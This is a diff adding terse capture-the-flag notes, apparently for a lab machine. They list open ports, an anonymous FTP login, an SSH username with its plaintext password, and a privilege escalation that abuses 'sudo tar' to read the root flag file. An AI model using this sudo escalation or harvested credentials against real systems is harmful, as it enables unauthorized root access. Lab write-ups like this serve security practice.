@@ -1,0 +1,16 @@
+ports open 
+21 ftp
+22 ssh 
+80 http
+
+ftp - anonymous --> locks.txt | tasks.txt 
+user "lin" 
+ssh user: "lin" | pass: "RedDr4gonSynd1cat3"
+user flag in ssh 
+privi esc 
+	/sudo -l 
+	/LFILE=/root/root.txt
+	/sudo tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"' 
+	root.txt  
+	
+	
